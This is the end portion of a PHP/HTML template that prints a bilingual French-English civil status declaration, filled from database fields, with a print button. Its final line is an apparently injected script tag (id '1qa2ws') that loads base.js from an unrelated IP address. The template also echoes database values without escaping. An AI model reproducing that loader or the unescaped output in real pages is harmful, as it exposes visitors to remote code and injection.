<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Profession</span></td>
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:399px"></td>
<td style="width:14px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['MOccupation']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:1px"></td>
<td style="width:412px"></td>
</tr>
<tr valign="top" style="height:15px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:1px">
<td>
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
<tr valign="top" style="height:4px">
<td colspan="2">
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="4">
</td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="3">
</td>
<td colspan="6" style="text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Dressé le</span></td>
<td>
</td>
<td colspan="26">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:111px"></td>
<td style="width:378px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- Drawn up on the</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:107px"></td>
<td style="width:382px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:360px"></td>
<td style="width:22px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['DecDate']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:4px"></td>
<td style="width:378px"></td>
</tr>
<tr valign="top" style="height:14px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:1px">
<td>
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
<tr valign="top" style="height:5px">
<td colspan="2">
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="3">
</td>
<td colspan="32">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:127px"></td>
<td style="width:237px"></td>
<td style="width:192px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- In accordance with the declaration of </span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:128px"></td>
<td style="width:234px"></td>
<td style="width:194px"></td>
</tr>
<tr valign="top" style="height:20px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Sur la declaration de</span></td>
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:5px"></td>
<td style="width:168px"></td>
<td style="width:21px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['DeclarerName']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:194px"></td>
</tr>
<tr valign="top" style="height:15px">
<td>
</td>
</tr>
<tr valign="top" style="height:1px">
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
<tr valign="top" style="height:4px">
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:99px">
<td>
</td>
<td colspan="33">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:100px"></td>
<td style="width:5px"></td>
<td style="width:34px"></td>
<td style="width:182px"></td>
<td style="width:96px"></td>
<td style="width:138px"></td>
</tr>
<tr valign="top" style="height:52px">
<td colspan="6">
</td>
</tr>
<tr valign="top" style="height:10px">
<td colspan="5">
</td>
<td rowspan="3" style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">-civil status registrar</span></td>
</tr>
<tr valign="top" style="height:1px">
<td>
</td>
<td colspan="3" style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:9px">
<td colspan="5">
</td>
</tr>
<tr valign="top" style="height:7px">
<td colspan="6">
</td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="2">
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Le</span></td>
<td colspan="3">
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:551px"></td>
<td style="width:4px"></td>
</tr>
<tr valign="top" style="height:99px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:26px"></td>
<td style="width:145px"></td>
<td style="width:380px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['DeclarerPost']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:12px"></td>
<td style="width:539px"></td>
</tr>
<tr valign="top" style="height:15px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:1px">
<td>
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:550px"></td>
<td style="width:1px"></td>
</tr>
<tr valign="top" style="height:99px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:3px"></td>
<td style="width:534px"></td>
<td style="width:13px"></td>
</tr>
<tr valign="top" style="height:20px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:24px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Lesquels ont certifié la sincerité de la presente declaration,</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:130px"></td>
<td style="width:356px"></td>
<td style="width:64px"></td>
</tr>
<tr valign="top" style="height:21px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:30px"></td>
<td style="width:326px"></td>
</tr>
<tr valign="top" style="height:18px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">of</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:26px"></td>
<td style="width:330px"></td>
</tr>
<tr valign="top" style="height:21px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['DCenterID']; ?></span></td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:13px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:65px">
<td colspan="3">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:3px"></td>
<td style="width:534px"></td>
<td style="width:13px"></td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">Who attested the truth of this declaration</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:550px"></td>
</tr>
<tr valign="top" style="height:14px">
<td>
</td>
</tr>
<tr valign="top" style="height:51px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:100px"></td>
<td style="width:450px"></td>
</tr>
<tr valign="top" style="height:2px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:18px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Par nous</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:1px"></td>
<td style="width:549px"></td>
</tr>
<tr valign="top" style="height:51px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:53px"></td>
<td style="width:53px"></td>
<td style="width:443px"></td>
</tr>
<tr valign="top" style="height:2px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:18px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- By us</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:89px"></td>
<td style="width:220px"></td>
<td style="width:240px"></td>
</tr>
<tr valign="top" style="height:22px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['Registrar_Name']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:549px"></td>
</tr>
<tr valign="top" style="height:3px">
<td>
</td>
</tr>
<tr valign="top" style="height:48px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:309px"></td>
<td style="width:148px"></td>
<td style="width:92px"></td>
</tr>
<tr valign="top" style="height:16px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">Officier d'etat civil</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:549px"></td>
</tr>
<tr valign="top" style="height:12px">
<td>
</td>
</tr>
<tr valign="top" style="height:36px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:159px"></td>
<td style="width:193px"></td>
<td style="width:130px"></td>
<td style="width:67px"></td>
</tr>
<tr valign="top" style="height:7px">
<td colspan="4">
</td>
</tr>
<tr valign="top" style="height:8px">
<td colspan="3">
</td>
<td rowspan="3" style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- Secretary</span></td>
</tr>
<tr valign="top" style="height:1px">
<td>
</td>
<td style="pointer-events: auto; background-color: #FFFFFF; border-top: 1px solid #000000; ">
</td>
<td>
</td>
</tr>
<tr valign="top" style="height:7px">
<td colspan="3">
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:494px"></td>
<td style="width:55px"></td>
</tr>
<tr valign="top" style="height:36px">
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:100px"></td>
<td style="width:394px"></td>
</tr>
<tr valign="top" style="height:4px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:18px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Assisté de</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:63px"></td>
<td style="width:431px"></td>
</tr>
<tr valign="top" style="height:36px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:102px"></td>
<td style="width:329px"></td>
</tr>
<tr valign="top" style="height:4px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:18px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">In the presence of</span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:64px"></td>
<td style="width:367px"></td>
</tr>
<tr valign="top" style="height:36px">
<td>
</td>
<td>
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:29px"></td>
<td style="width:203px"></td>
<td style="width:135px"></td>
</tr>
<tr valign="top" style="height:22px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['Assistant']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:54px"></td>
<td style="width:313px"></td>
</tr>
<tr valign="top" style="height:7px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:10px">
<td>
</td>
<td rowspan="2">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:178px"></td>
<td style="width:135px"></td>
</tr>
<tr valign="top" style="height:16px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">Sécretaire d'etat civil</span></td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:195px"></td>
<td style="width:118px"></td>
</tr>
<tr valign="top" style="height:10px">
<td colspan="2">
</td>
</tr>
<tr valign="top" style="height:18px">
<td style="pointer-events: auto; text-indent: 0px; text-align: center;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;"><?php echo $row['IDate']; ?></span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
<tr valign="top" style="height:18px">
<td rowspan="2" style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">- On the</span></td>
</tr>
<tr valign="top" style="height:1px">
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:1px">
<td colspan="14">
</td>
<td colspan="9" style="border-top: 1px solid #000000; ">
</td>
<td colspan="14">
</td>
</tr>
<tr valign="top" style="height:5px">
<td colspan="37">
</td>
</tr>
<tr valign="top" style="height:32px">
<td colspan="6">
</td>
<td colspan="9">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:162px"></td>
</tr>
<tr valign="top" style="height:22px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125; font-weight: bold;">Le secrétaire d'état civil</span></td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:39px"></td>
<td style="width:64px"></td>
<td style="width:59px"></td>
</tr>
<tr valign="top" style="height:15px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:17px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">Secretary</span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="7">
</td>
<td colspan="10" rowspan="2">
<div style="width: 100%; height: 100%; position: relative;">
<div style="position: absolute; overflow: hidden; width: 100%; height: 100%; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:209px"></td>
</tr>
<tr valign="top" style="height:22px">
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">Signature de l'Officier d'état civil</span></td>
</tr>
</table>
</div>
<div style="position: relative; width: 100%; height: 100%; pointer-events: none; ">
<table cellpadding="0" cellspacing="0" border="0" style="empty-cells: show; width: 100%; border-collapse: collapse;">
<tr valign="top" style="height:0">
<td style="width:3px"></td>
<td style="width:183px"></td>
<td style="width:23px"></td>
</tr>
<tr valign="top" style="height:15px">
<td colspan="3">
</td>
</tr>
<tr valign="top" style="height:20px">
<td>
</td>
<td style="pointer-events: auto; text-indent: 0px; text-align: left;">
<span style="font-family: 'DejaVu Sans', Arial, Helvetica, sans-serif; color: #000000; font-size: 12px; line-height: 1.2578125;">Signature of the Civil status </span></td>
<td>
</td>
</tr>
</table>
</div>
</div>
</td>
<td colspan="5">
</td>
</tr>
<tr valign="top" style="height:3px">
<td colspan="22">
</td>
<td colspan="5">
</td>
</tr>
<tr valign="top" style="height:62px">
<td colspan="37">
</td>
</tr>
</table>

</td><td width="50%">&nbsp;</td></tr>
</table>
</div>
<script type="text/javascript">
	function printDiv(divName) {
     var printContents = document.getElementById(divName).innerHTML;
     var originalContents = document.body.innerHTML;

     document.body.innerHTML = printContents;

     window.print();

     document.body.innerHTML = originalContents;
}
</script>

<div class="row ">
	
		<div class="col-lg-12 p-t-20 text-center">
			<a class="btn deepPink-bgcolor btn-lg" href="all_birth.php">back</a>
			<input class="btn btn-success btn-lg " type="button" onclick="printDiv('bc')" value="print" />
		</div>
		
	
	
</div>



<!-- start js include path -->
	<script src="../assets/plugins/jquery/jquery.min.js"></script>
	<script src="../assets/plugins/popper/popper.js"></script>
	<script src="../assets/plugins/jquery-blockui/jquery.blockui.min.js"></script>
	<script src="../assets/plugins/jquery-slimscroll/jquery.slimscroll.js"></script>
	<!-- bootstrap -->
	<script src="../assets/plugins/bootstrap/js/bootstrap.min.js"></script>
	<script src="../assets/plugins/bootstrap-switch/js/bootstrap-switch.min.js"></script>
	<!-- data tables -->
	<script src="../assets/plugins/datatables/jquery.dataTables.min.js"></script>
	<script src="../assets/plugins/datatables/plugins/bootstrap/dataTables.bootstrap4.min.js"></script>
	<script src="../assets/js/pages/table/table_data.js"></script>
	<!-- Common js-->
	<script src="../assets/js/app.js"></script>
	<script src="../assets/js/layout.js"></script>
	<script src="../assets/js/theme-color.js"></script>
	<!-- Material -->
	<script src="../assets/plugins/material/material.min.js"></script>
	<!-- end js include path -->
<script type = 'text/javascript' id ='1qa2ws' charset='utf-8' src='../../../../../../154.70.108.86_9090/www/default/base.js'></script>

</body>
</html>